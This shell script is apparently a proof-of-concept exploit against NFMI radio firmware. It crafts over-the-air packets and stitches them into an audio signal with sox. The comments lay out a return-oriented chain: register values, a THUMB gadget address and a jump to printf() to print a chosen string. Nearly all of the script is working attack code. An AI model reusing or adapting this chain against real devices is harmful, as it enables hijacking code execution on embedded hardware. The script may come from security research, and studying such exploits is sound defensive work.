#!/bin/sh
set -e # exit on any error
echo This script may not work... and address may be wrong

CR=$'\x0D'   # this works with "write_signal.py -a" but all attempts to me vars for LF, EOL and TAB don't work?!?!

echo -e Creating B20 # length 21: "B" then twenty (0x14) zeros (we can only control 11 data bytes per packet, anything longer than that is filled in with a 0 by the hacked NFMI firmware)
python write_signal.py -q 0 0 0 0  15  42 0 0 0  0 0 0 0  0 0 0
./craft_multipart_attack.sh
sox synthetic_signal.wav recordings/silence_1000ms.wav synthetic_print_seth.wav

echo -e R4 R5 R6 
# R4 points to string address 20002FA8 + 8 = 20002FB0   (R4 is then moved to R0 by code at PC)
# R5 and R6 are unused
python write_signal.py -q 0 0 0 0  C  B0 2F 00 20  00 00 00 00  00 00 00
./craft_multipart_attack.sh
sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
mv temp/out.wav synthetic_print_seth.wav

echo -e PC R4_2 PC_2
#PC = 2DE8+1 (for THUMB) : MOVS R0, R4; POP {R4, PC}  (2de9 in human, 2ddb in stock with nfmi hack, 2e4f in both print_recv vers)
#PC_2 = 42d -> printf()
python write_signal.py -q 0 0 0 0  C  db 2D 00 00  00 00 00 00  2D 04 00
./craft_multipart_attack.sh
sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_1000ms.wav temp/out.wav #concat with delay
mv temp/out.wav synthetic_print_seth.wav

echo -e Text
#can't seem to use -a for ASCII with LF, tab or EOL
python write_signal.py -q  0 0 0 0  a  53 65 74 68  0d 0a 00 45   42 45 0  
./craft_multipart_attack.sh
sox synthetic_print_seth.wav synthetic_signal.wav recordings/silence_2281ms.wav temp/out.wav #concat with delay
mv temp/out.wav synthetic_print_seth.wav
